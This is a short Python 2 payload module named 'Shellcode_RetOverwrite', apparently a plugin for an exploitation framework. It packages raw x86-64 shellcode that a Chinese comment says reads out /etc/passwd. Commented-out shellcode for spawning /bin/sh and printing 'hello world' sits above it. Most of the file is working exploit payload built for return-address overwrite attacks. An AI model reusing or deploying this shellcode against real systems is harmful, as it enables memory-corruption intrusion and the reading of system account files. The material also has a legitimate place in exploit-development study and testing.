#! /usr/bin/python
# coding:UTF-8
'''Shellcode_RetOverwrite'''

#shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
#shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
#shellcode += "\x0b\xcd\x80"

#print1 hello world
#shellcode="\xeb\x13\x5e\xb8\x01\x00\x00\x00"
#shellcode +="\xbf\x01\x00\x00\x00\xba\x0d\x00"
#shellcode +="\x00\x00\x0f\x05\xcc\xe8\xe8\xff"
#shellcode +="\xff\xff\x48\x65\x6c\x6c\x6f\x20"
#shellcode +="\x77\x6f\x72\x6c\x64\x21\x0a"

#print2 hello world
#shellcode="\xeb\x1e\x5e\x48\x31\xc0\xb0\x01"
#shellcode +="\x48\x89\xc7\x48\x89\xfa\x48\x83"
#shellcode +="\xc2\x0e\x0f\x05\x48\x31\xc0\x48"
#shellcode +="\x83\xc0\x3c\x48\x31\xff\x0f\x05"
#shellcode +="\xe8\xdd\xff\xff\xff\x48\x65\x6c"
#shellcode +="\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a"


#这段shellcode的作用是读出/etc/passwd的内容
shellcode="\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02"
shellcode +="\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d"
shellcode +="\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f"
shellcode +="\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01"
shellcode +="\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31"
shellcode +="\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65"
shellcode +="\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
class Payload(object):
    def __init__(self):
        self.info = '这段shellcode的作用是读出/etc/passwd的内容'
        self.data = shellcode

if __name__=='__main__':
    p=Payload()
    if hasattr(p,'info') and hasattr(p,'data'):
        print "Correct Payload."
    else:
        print "Error: Payload missing 'info' or 'data'."
    print p.info
